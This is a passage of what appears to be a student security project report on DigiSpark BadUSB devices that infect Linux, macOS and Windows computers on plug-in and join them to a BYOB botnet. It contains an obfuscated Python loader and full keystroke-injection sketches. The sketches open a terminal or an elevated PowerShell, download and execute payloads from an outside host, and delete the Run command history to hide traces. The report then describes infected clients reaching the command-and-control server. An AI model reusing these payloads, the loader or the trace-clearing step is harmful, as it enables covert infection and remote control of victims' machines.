    &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;version_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;marshal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decompress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'eJwrtmBgYCgtyskvSM3TUM8oKSmw0tcvzkhNLdBLTixOtDI0NrYACpQkpqcWFesXJCfqFVSqa+oVpSamaGgCAFaFE3g='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;mac-osx-payload&quot;&gt;Mac (OSX) Payload&lt;/h3&gt;
&lt;p&gt;In order to prevent the keyboard configuration dialog box from appearing when the DigiSpark is plugged into an Apple computer, we must configure the DigiSpark to appear as if it’s an Apple keyboard.&lt;/p&gt;

&lt;p&gt;VID and PID are defined in the file &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.arduino15/packages/digistump/hardware/avr/1.6.7/libraries/DigisparkKeyboard/usbconfig.h&lt;/code&gt;. We will replace the existing file with a &lt;a href=&quot;./scripts/Digispark/usbconfig.h&quot;&gt;modified Apple version&lt;/a&gt; when compiling the script for OSX. When we change Vendor Name and Device Name, we also have to adapt the constants for the name length.&lt;/p&gt;

&lt;p&gt;The following code is what we’ve developed to infect Apple OSX machines upon plugin.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &quot;DigiKeyboard.h&quot;
&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/***
 *
 * This is an attack for Mac (OSX) machines. It opens up a terminal window, and executes the bash command. It then downloads the loader, sets it to executable,
 * executes it, and closes the terminal window.
 *
 ***/&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#define MOD_CMD_LEFT 0x00000008
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_SPACE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MOD_GUI_LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;terminal&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_ENTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_ENTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_ENTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nohup wget https://sheep.casa/payloads/linux_loader -P /tmp &amp;amp;&amp;amp; nohup chmod +x /tmp/linux_loader &amp;amp;&amp;amp; nohup /tmp/linux_loader &amp;amp; exit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;disown $!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_Q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MOD_GUI_LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_ENTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see above, is very similar to what we’ve used to exploit Linux machines. The major difference is the way the terminal is opened. We’ve had to modify our OSX version to use &lt;code class=&quot;highlighter-rouge&quot;&gt;DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);&lt;/code&gt;, which will open Spotlight search. The code will delay for .5 seconds, and search “terminal”, delay for .5 seconds, and press enter, opening the terminal.&lt;/p&gt;

&lt;p&gt;After this, in order to ensure we aren’t using Z Shell, we’ll enter &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt;. From this point on the rest of the code is exactly the same as our Linux payload. It too downloads &lt;code class=&quot;highlighter-rouge&quot;&gt;linux_loader&lt;/code&gt;, which downloads and runs &lt;code class=&quot;highlighter-rouge&quot;&gt;linux_payload.py&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;windows&quot;&gt;Windows&lt;/h3&gt;
&lt;p&gt;Below is the DigiSpark payload we developed to infect Windows victims.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &quot;DigiKeyboard.h&quot;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pinMode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OUTPUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//LED on Model A&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;digitalWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HIGH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;digitalWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_R&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MOD_GUI_LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;powershell Start-Process powershell -Verb runAs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_ENTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_Y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MOD_ALT_LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$down = New-Object System.Net.WebClient; $url = 'https://sheep.casa/payloads/windows_payload.exe'; $file = 'windows_payload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_R&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MOD_GUI_LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// Clear run command history&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;reg delete HKEY_CURRENT_USER&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Software&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Microsoft&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;CurrentVersion&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Explorer&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;RunMRU /va /f&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_ENTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;digitalWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HIGH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The above code opens powershell to download and execute our &lt;code class=&quot;highlighter-rouge&quot;&gt;windows_payload.exe&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;windows-payload-for-botnet&quot;&gt;Windows Payload for Botnet&lt;/h4&gt;
&lt;p&gt;To generate a Windows client for our botnet, we must run the code from a Windows machine to create an executable. Unfortunately, BYOB has a significant amount of bugs at the moment, and cross platform compatibility is not as it claims to be. &lt;strong&gt;To successfully connect to our botnet from Windows, we needed to host the C&amp;amp;C server on a Windows machine.&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;examples&quot;&gt;Examples&lt;/h2&gt;

&lt;h3 id=&quot;video&quot;&gt;Video&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://sheep.casa/csc154_project.m4v&quot;&gt;https://sheep.casa/csc154_project.m4v&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;linuxosx&quot;&gt;Linux/OSX&lt;/h3&gt;
&lt;p&gt;Below is an example of a client connecting to the C&amp;amp;C server. This is actually Ryan’s laptop connecting, after plugging the BadUSB device into it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/12/infected.png&quot; alt=&quot;infected&quot; /&gt;
&lt;strong&gt;Figure 11:&lt;/strong&gt; Session on x at wartop (Ryan’s Laptop).&lt;/p&gt;

&lt;h3 id=&quot;windows-1&quot;&gt;Windows&lt;/h3&gt;
&lt;p&gt;Below is an example of a Windows client connecting to a Windows C&amp;amp;C host,&lt;br /&gt;
&lt;img src=&quot;/wp-content/uploads/2019/12/session_demo.png&quot; alt=&quot;session_demo&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 12:&lt;/strong&gt; Windows client connection.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;We’ve configured our BadUSB devices to infect Linux, Windows and OSX machines. Upon plugin, our device will execute a payload to join our Botnet. Below is an elaboration on the successes and failures of the project.&lt;/p&gt;

&lt;h3 id=&quot;limitations&quot;&gt;Limitations&lt;/h3&gt;

&lt;h4 id=&quot;badusb-1&quot;&gt;BadUSB&lt;/h4&gt;

&lt;p&gt;Ideally, the same BadUSB device would be able to infect Windows, OSX, and Linux. However, from what we’ve researched this may not be technically achievable given the way USB functions. There seems to be no way to query information from the machine, the device simply sends keystrokes blindly. At this time a DigiSpark must be configured to infect one specific operating system, because currently we do not have knowledge of how to detect which operating system a victim’s computer is running.&lt;/p&gt;

&lt;p&gt;We did attempt loading all of our payloads onto one device (Hail Mary). This failed because arbitrary keystrokes were executed on a machine either before or after that machine’s OS specific code was run. This resulted in unpredictable behavior, which prevented even the correct code from executing sometimes.&lt;/p&gt;

&lt;h4 id=&quot;byob-botnet&quot;&gt;BYOB Botnet&lt;/h4&gt;

&lt;p&gt;The botnet framework we chose to use is still very buggy. By the time we concluded that certain limitations could not be overcome, it was no longer an option to pivot the project to a new botnet framework. It turns out the cross platform compatibility of BYOB is not as it claims, as we were not able to connect windows victims to our Linux server. Although we compiled bots on both python 2 and 3, and tried numerous workarounds suggested on Github, it simply would not work. Issues &lt;a href=&quot;https://github.com/malwaredllc/byob/issues/92&quot;&gt;1&lt;/a&gt;,&lt;a href=&quot;https://github.com/malwaredllc/byob/issues/164&quot;&gt;2&lt;/a&gt; on the GitHub repository for the framework echo our own issues, yet remain unresolved. We raised an issue ourselves at the beginning of the semester, but it was not addressed at the time of writing this report.&lt;/p&gt;

&lt;h3 id=&quot;further&quot;&gt;Further&lt;/h3&gt;
&lt;p&gt;If we were to continue working on this project we would need to find a better botnet framework, or develop our own simple C&amp;amp;C server to handle reverse shells from victims. The bugs in BYOB are too numerous for its lack of support from the developer.&lt;/p&gt;

&lt;p&gt;We would still like to explore the ability to infect all operating systems using the same BadUSB device, but as we said, it couldn’t be achieved at this time.&lt;/p&gt;

&lt;h3 id=&quot;final-words&quot;&gt;Final Words&lt;/h3&gt;
